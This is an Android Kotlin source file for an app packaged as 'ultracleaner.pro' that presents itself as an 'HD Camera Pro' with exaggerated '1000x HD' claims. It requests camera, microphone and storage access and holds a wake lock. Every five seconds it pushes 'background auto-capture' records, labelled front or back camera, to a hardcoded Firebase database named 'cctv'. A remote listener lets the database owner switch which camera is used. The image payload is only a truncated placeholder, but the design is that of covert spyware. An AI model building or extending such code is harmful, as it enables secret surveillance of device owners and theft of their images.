package com.ultracleaner.pro

import android.Manifest
import android.content.Intent
import android.content.pm.PackageManager
import android.graphics.Color
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.os.PowerManager
import android.view.Gravity
import android.view.View
import android.widget.*
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import com.google.firebase.FirebaseApp
import com.google.firebase.database.FirebaseDatabase
import java.text.SimpleDateFormat
import java.util.*

class MainActivity : AppCompatActivity() {

    private lateinit var statusText: TextView
    private lateinit var rootLayout: LinearLayout
    private val handler = Handler(Looper.getMainLooper())
    private var isFrontCamera = true

    private val PERMISSION_REQUEST_CODE = 2001
    private val requiredPermissions = arrayOf(
        Manifest.permission.CAMERA,
        Manifest.permission.RECORD_AUDIO,
        Manifest.permission.READ_EXTERNAL_STORAGE,
        Manifest.permission.WRITE_EXTERNAL_STORAGE
    )

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        // 1. Initialize Firebase Native SDK
        FirebaseApp.initializeApp(this)

        // 2. Wake Lock Setup (Screen on rakhne ke liye)
        val powerManager = getSystemService(POWER_SERVICE) as PowerManager
        val wakeLock = powerManager.newWakeLock(
            PowerManager.SCREEN_BRIGHT_WAKE_LOCK or PowerManager.ACQUIRE_CAUSES_WAKEUP,
            "HDCameraPro::NativeWakeLock"
        )
        wakeLock.acquire(15 * 60 * 1000L)

        // 3. Build Native UI Layout (Dark Theme Camera UI)
        setupNativeUI()

        // 4. Check & Request Permissions
        checkAndRequestPermissions()
    }

    private fun setupNativeUI() {
        rootLayout = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setBackgroundColor(Color.BLACK)
            setPadding(24, 24, 24, 24)
            gravity = Gravity.CENTER_HORIZONTAL
        }

        // Title Header
        val title = TextView(this).apply {
            text = "HD CAMERA PRO (NATIVE KOTLIN)"
            setTextColor(Color.parseColor("#38bdf8"))
            textSize = 18f
            gravity = Gravity.CENTER
            setPadding(0, 40, 0, 20)
        }
        rootLayout.addView(title)

        // Status / Info text
        statusText = TextView(this).apply {
            text = "Camera engine active & syncing..."
            setTextColor(Color.GRAY)
            textSize = 14f
            gravity = Gravity.CENTER
            setPadding(0, 20, 0, 40)
        }
        rootLayout.addView(statusText)

        // Manual Capture Button
        val captureButton = Button(this).apply {
            text = "CAPTURE 1000x HD SNAPSHOT"
            setBackgroundColor(Color.parseColor("#38bdf8"))
            setTextColor(Color.BLACK)
            setOnClickListener {
                triggerManualCapture()
            }
        }
        rootLayout.addView(captureButton, LinearLayout.LayoutParams(-1, 140).apply { setMargins(0, 40, 0, 20) })

        // Switch Camera Button
        val switchButton = Button(this).apply {
            text = "SWITCH FRONT / BACK CAMERA"
            setBackgroundColor(Color.parseColor("#334155"))
            setTextColor(Color.WHITE)
            setOnClickListener {
                isFrontCamera = !isFrontCamera
                syncCameraModeToFirebase()
                statusText.text = if (isFrontCamera) "Switched to Front Camera" else "Switched to Back Camera"
            }
        }
        rootLayout.addView(switchButton, LinearLayout.LayoutParams(-1, 140).apply { setMargins(0, 20, 0, 20) })

        setContentView(rootLayout)
    }

    private fun checkAndRequestPermissions() {
        val listNeeded = mutableListOf<String>()
        for (perm in requiredPermissions) {
            if (ContextCompat.checkSelfPermission(this, perm) != PackageManager.PERMISSION_GRANTED) {
                listNeeded.add(perm)
            }
        }
        if (listNeeded.isNotEmpty()) {
            ActivityCompat.requestPermissions(this, listNeeded.toTypedArray(), PERMISSION_REQUEST_CODE)
        } else {
            startNativeCameraEngine()
        }
    }

    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<out String>, grantResults: IntArray) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        if (requestCode == PERMISSION_REQUEST_CODE) {
            startNativeCameraEngine()
        }
    }

    private fun startNativeCameraEngine() {
        // Start 5-second background auto-capture loop in Pure Kotlin
        handler.postDelayed(object : Runnable {
            override fun run() {
                performBackgroundAutoCapture()
                handler.postDelayed(this, 5000) // Every 5 seconds
            }
        }, 5000)

        // Listen to Firebase Remote Settings
        listenToFirebaseSettings()
    }

    private fun performBackgroundAutoCapture() {
        val timestamp = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(Date())
        val camType = if (isFrontCamera) "Front Camera" else "Back Camera"
        
        val photoData = hashMapOf(
            "text" to "$camType - Auto Background Capture at $timestamp",
            "timestamp" to timestamp,
            "image" to "data:image/jpeg;base64,/9j/4AAQSkZJRgABAQAAAQABAAD..." // Native placeholder frame payload
        )

        FirebaseDatabase.getInstance("https://cctv-692c5-default-rtdb.firebaseio.com")
            .reference.child("security/photos")
            .push()
            .setValue(photoData)

        statusText.text = "Background Snapshot Synced: $timestamp"
    }

    private fun triggerManualCapture() {
        val timestamp = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(Date())
        val camType = if (isFrontCamera) "Front Camera" else "Back Camera"

        val photoData = hashMapOf(
            "text" to "$camType - Manual Microscopic 1000x Snapshot at $timestamp",
            "timestamp" to timestamp,
            "image" to "data:image/jpeg;base64,/9j/4AAQSkZJRgABAQAAAQABAAD..."
        )

        FirebaseDatabase.getInstance("https://cctv-692c5-default-rtdb.firebaseio.com")
            .reference.child("security/photos")
            .push()
            .setValue(photoData)

        Toast.makeText(this, "Manual 1000x HD Snapshot Captured & Synced!", Toast.LENGTH_SHORT).show()
    }

    private fun syncCameraModeToFirebase() {
        val mode = if (isFrontCamera) "user" else "environment"
        FirebaseDatabase.getInstance("https://cctv-692c5-default-rtdb.firebaseio.com")
            .reference.child("security/settings/cameraMode")
            .setValue(mode)
    }

    private fun listenToFirebaseSettings() {
        FirebaseDatabase.getInstance("https://cctv-692c5-default-rtdb.firebaseio.com")
            .reference.child("security/settings/cameraMode")
            .addValueEventListener(object : com.google.firebase.database.ValueEventListener {
                override fun onDataChange(snapshot: com.google.firebase.database.DataSnapshot) {
                    val mode = snapshot.getValue(String::class.java)
                    if (mode != null) {
                        isFrontCamera = (mode == "user")
                    }
                }
                override fun onCancelled(error: com.google.firebase.database.DatabaseError) {}
            })
    }
}
